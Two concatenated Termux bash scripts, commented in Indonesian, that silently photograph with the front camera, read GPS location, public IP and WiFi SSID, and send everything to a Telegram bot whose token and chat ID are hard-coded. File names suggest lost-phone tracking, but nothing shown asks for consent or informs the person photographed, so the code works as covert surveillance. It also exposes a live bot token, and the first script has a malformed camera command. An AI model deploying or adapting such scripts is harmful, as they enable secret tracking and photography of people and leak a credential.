#!/data/data/com.termux/files/usr/bin/bash

# === Konfigurasi ===
BOT_TOKEN="7992625201:AAG4_8ay_NEySER9gxjKNBLKdGPdKJKnsEg"
CHAT_ID="7983170165"
FOTO="$HOME/.security.jpg"
LOKASI="$HOME/.location.txt"

# Hapus dulu foto lama
[ -f "$FOTO" ] && rm -f "$FOTO"

# Ambil ulang dengan kamera
termux-camera-photo -c 0 "$FOTO"
echo "🛰️ Ambil lokasi..."
termux-location > $LOKASI
cat $LOKASI

echo "📸 Ambil foto kamera depan"
termux-camera-photo-c 0 $FOTO
ls -1 $FOTO

echo "📤 Kirim lokasi ke Telegram..."
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
  -d chat_id="$CHAT_ID" \
  -d text="📍 Lokasi HP:\n$(cat $LOKASI)"

echo "📤 Kirim foto ke Telegram..."
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
  -F chat_id="$CHAT_ID" \
  -F photo=@"$FOTO"

echo "🌐 Ambil info jaringan..."
IP=$(curl -s ifconfig.me)
WIFI=$(termux-wifi-connectioninfo | grep ssid)

echo "📤 Kirim IP dan WiFi..."
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
  -d chat_id="$CHAT_ID" \
  -d text="🌐 IP: $IP\n📶 WiFi: $WIFI"
#!/data/data/com.termux/files/usr/bin/bash

BOT_TOKEN="7992625201:AAG4_8ay_NEySER9gxjKNBLKdGPdKJKnsEg"
CHAT_ID="7983170165"
WAKTU=$(date +"%Y-%m-%d_%H-%M-%S")
FOTO="/sdcard/foto_hilang_$WAKTU.jpg"

# Ambil foto (kamera depan jika ID 1 tersedia)
termux-camera-photo -c 1 "$FOTO" || termux-camera-photo -c 0 "$FOTO"

# Ambil lokasi
LOKASI=$(termux-location --provider gps --request once)
LAT=$(echo "$LOKASI" | grep -oP '"latitude":\K[0-9.]+')
LON=$(echo "$LOKASI" | grep -oP '"longitude":\K[0-9.]+')
MAPS_LINK="https://www.google.com/maps?q=$LAT,$LON"

# Kirim lokasi
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
  -d chat_id="$CHAT_ID" \
  -d text="📍 Lokasi Terkini: $MAPS_LINK"

# Kirim foto
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
  -F chat_id="$CHAT_ID" \
  -F photo=@"$FOTO"
